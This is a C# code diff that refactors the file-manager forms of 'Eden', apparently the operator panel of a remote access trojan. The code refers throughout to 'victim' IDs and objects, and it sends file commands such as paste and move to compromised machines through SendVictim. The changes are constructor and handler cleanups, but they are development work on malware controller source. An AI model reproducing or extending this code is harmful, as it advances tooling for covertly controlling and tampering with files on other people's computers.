@@ -220,14 +220,6 @@ namespace Eden
                             ShowReadFile(szFilename, szContent);
                         }
                     }
-                    else if (aMsg[1] == "write")
-                    {
-                        int code = int.Parse(aMsg[2]);
-                        if (code == 0)
-                        {
-                            MessageBox.Show(aMsg[3], "Write error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        }
-                    }
                     else if (aMsg[1] == "del")
                     {
                         List<List<string>> lsResult = clsTools.EZData.String2TwoDList(aMsg[2]);
@@ -416,8 +408,7 @@ namespace Eden
                 frmFileEditor f = clsTools.FindForm<frmFileEditor>(szVictimID);
                 if (f == null)
                 {
-                    f = new frmFileEditor();
-                    f.m_szVictimID = szVictimID;
+                    f = new frmFileEditor(m_victim);
 
                     f.Show();
                 }
@@ -450,11 +441,7 @@ namespace Eden
             {
                 string[] aCols = { "Filename", "Status" };
 
-                frmListViewItem f = new frmListViewItem();
-                f.m_aCols = aCols;
-                f.m_aItemText = lsFiles.ToArray();
-                f.szVictimID = szVictimID;
-
+                frmListViewItem f = new frmListViewItem(m_victim, aCols, lsFiles.ToArray());
                 f.Show();
             }
 
@@ -472,7 +459,7 @@ namespace Eden
         {
             Invoke(new Action(() =>
             {
-                frmListViewItem f = clsTools.FindForm<frmListViewItem>(szVictimID);
+                frmListViewItem f = clsTools.FindForm<frmListViewItem>(m_victim);
                 if (f != null)
                 {
                     foreach (var st in lsFiles)
@@ -492,10 +479,7 @@ namespace Eden
             if (bShowWindow)
             {
                 string[] alpCols = { "Url", "Filename", "Message" };
-                frmListViewItem f = new frmListViewItem();
-                f.m_aCols = alpCols;
-                f.szVictimID = szVictimID;
-                f.m_aItemText = lsUrls.ToArray();
+                frmListViewItem f = new frmListViewItem(m_victim, alpCols, lsUrls.ToArray());
 
                 f.Show();
             }
@@ -540,11 +524,10 @@ namespace Eden
 
         private void SendPaste(List<stEntryTag> lsEntry, bool bMove = false)
         {
+            string[] cols = new string[] { "Name", "Status" };
             string[] aEntry = lsEntry.Select(x => x.bDirectory ? $"{x.szFullName}/" : x.szFullName).ToArray();
 
-            frmListViewItem f = new frmListViewItem();
-            f.m_aCols = new string[] { "Name", "Status" };
-            f.m_aItemText = aEntry;
+            frmListViewItem f = new frmListViewItem(m_victim, cols, aEntry);
             f.Show();
 
             m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{clsTools.EZData.OneDList2String(aEntry.ToList())}|{fnGetCurrentDir()}");
@@ -814,9 +797,7 @@ namespace Eden
         //New - File
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
-            frmFileEditor f = new frmFileEditor();
-            f.m_szVictimID = szVictimID;
-            f.m_clnt = m_clnt;
+            frmFileEditor f = new frmFileEditor(m_victim);
 
             f.Show();
 
